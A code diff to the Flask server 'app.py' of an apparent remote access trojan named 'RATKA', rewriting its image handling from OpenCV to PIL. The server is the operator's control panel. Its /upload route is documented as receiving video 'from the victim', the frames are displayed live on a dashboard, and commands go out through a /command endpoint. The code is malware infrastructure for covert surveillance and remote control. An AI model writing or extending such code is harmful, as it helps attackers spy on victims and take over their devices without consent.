@@ -1,17 +1,14 @@
-# app.py - ГЛАВНЫЙ ФАЙЛ ДЛЯ RENDER
+# app.py - ДЛЯ RENDER (БЕЗ OPENCV, ТОЛЬКО PIL)
 from flask import Flask, request, jsonify, send_file
-import cv2
-import numpy as np
 import base64
 import io
-import time
 import os
+from PIL import Image
 
 app = Flask(__name__)
 
-# Хранилище (в памяти)
+# Хранилище
 current_frame = None
-clients = 0
 
 @app.route('/')
 def index():
@@ -43,8 +40,7 @@ def index():
                 margin-bottom: 15px;
                 background: rgba(0,255,136,0.05);
             }
-            .header h1 { font-size: 28px; text-shadow: 0 0 30px rgba(0,255,136,0.2); }
-            .header .sub { color: #88ffaa; font-size: 13px; opacity: 0.7; }
+            .header h1 { font-size: 28px; }
             .video-box {
                 background: #000;
                 border: 3px solid #00ff88;
@@ -61,14 +57,12 @@ def index():
                 width: 100%;
                 height: 100%;
                 object-fit: cover;
-                display: block;
             }
             .video-box .placeholder {
                 position: absolute;
                 color: #00ff88;
                 opacity: 0.5;
                 text-align: center;
-                pointer-events: none;
             }
             .video-box .placeholder .icon { font-size: 48px; display: block; }
             .status {
@@ -80,7 +74,6 @@ def index():
                 border-radius: 12px;
                 margin-bottom: 15px;
                 background: rgba(0,255,136,0.05);
-                font-size: 12px;
             }
             .status-item { text-align: center; }
             .status-item .label { opacity: 0.6; font-size: 10px; text-transform: uppercase; }
@@ -124,22 +117,16 @@ def index():
                 transition: opacity 0.3s;
                 pointer-events: none;
                 z-index: 999;
-                white-space: nowrap;
             }
             .toast.show { opacity: 1; }
-            .footer {
-                text-align: center;
-                margin-top: 15px;
-                font-size: 11px;
-                opacity: 0.3;
-            }
+            .footer { text-align: center; margin-top: 15px; font-size: 11px; opacity: 0.3; }
         </style>
     </head>
     <body>
         <div class="container">
             <div class="header">
                 <h1>🎯 RATKA</h1>
-                <div class="sub">Управление через интернет (без портов)</div>
+                <div style="font-size:13px;opacity:0.7;">Управление через интернет</div>
             </div>
             
             <div class="video-box">
@@ -188,8 +175,6 @@ def index():
             const statusEl = document.getElementById('status');
             const clientsEl = document.getElementById('clients');
             
-            let connected = false;
-            
             function updateVideo() {
                 video.src = '/video?_=' + Date.now();
             }
@@ -197,21 +182,8 @@ def index():
             
             video.onload = function() {
                 placeholder.style.display = 'none';
-                if (!connected) {
-                    connected = true;
-                    statusEl.textContent = '🟢 Онлайн';
-                    statusEl.className = 'value online';
-                    showToast('✅ Подключено!');
-                }
-            };
-            
-            video.onerror = function() {
-                if (connected) {
-                    connected = false;
-                    statusEl.textContent = '⏳ Ожидание';
-                    statusEl.className = 'value offline';
-                    placeholder.style.display = 'block';
-                }
+                statusEl.textContent = '🟢 Онлайн';
+                statusEl.className = 'value online';
             };
             
             function showToast(text) {
@@ -224,8 +196,7 @@ def index():
             
             async function sendCommand(cmd, val) {
                 try {
-                    const url = '/command?cmd=' + encodeURIComponent(cmd) + (val !== undefined ? '&val=' + encodeURIComponent(val) : '');
-                    await fetch(url);
+                    await fetch('/command?cmd=' + encodeURIComponent(cmd) + (val !== undefined ? '&val=' + encodeURIComponent(val) : ''));
                 } catch(e) {}
             }
             
@@ -282,15 +253,14 @@ def index():
 @app.route('/upload', methods=['POST'])
 def upload():
     """Принимает видео от жертвы"""
-    global current_frame, clients
+    global current_frame
     
     try:
         data = request.get_json()
         if 'frame' in data:
             frame_data = base64.b64decode(data['frame'])
-            np_arr = np.frombuffer(frame_data, np.uint8)
-            current_frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
-            clients = 1
+            img = Image.open(io.BytesIO(frame_data))
+            current_frame = img
             return jsonify({'status': 'ok'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -303,18 +273,16 @@ def video():
     global current_frame
     
     if current_frame is not None:
-        _, buf = cv2.imencode('.jpg', current_frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
-        return send_file(
-            io.BytesIO(buf.tobytes()),
-            mimetype='image/jpeg'
-        )
+        buf = io.BytesIO()
+        current_frame.save(buf, format='JPEG', quality=70)
+        buf.seek(0)
+        return send_file(buf, mimetype='image/jpeg')
     else:
-        black = np.zeros((480, 640, 3), dtype=np.uint8)
-        _, buf = cv2.imencode('.jpg', black)
-        return send_file(
-            io.BytesIO(buf.tobytes()),
-            mimetype='image/jpeg'
-        )
+        img = Image.new('RGB', (640, 480), color='black')
+        buf = io.BytesIO()
+        img.save(buf, format='JPEG')
+        buf.seek(0)
+        return send_file(buf, mimetype='image/jpeg')
 
 @app.route('/command')
 def command():
@@ -327,9 +295,9 @@ def command():
 @app.route('/status')
 def status():
     """Статус"""
-    global current_frame, clients
+    global current_frame
     return jsonify({
-        'clients': clients,
+        'clients': 1 if current_frame is not None else 0,
         'status': 'online' if current_frame is not None else 'waiting'
     })
 
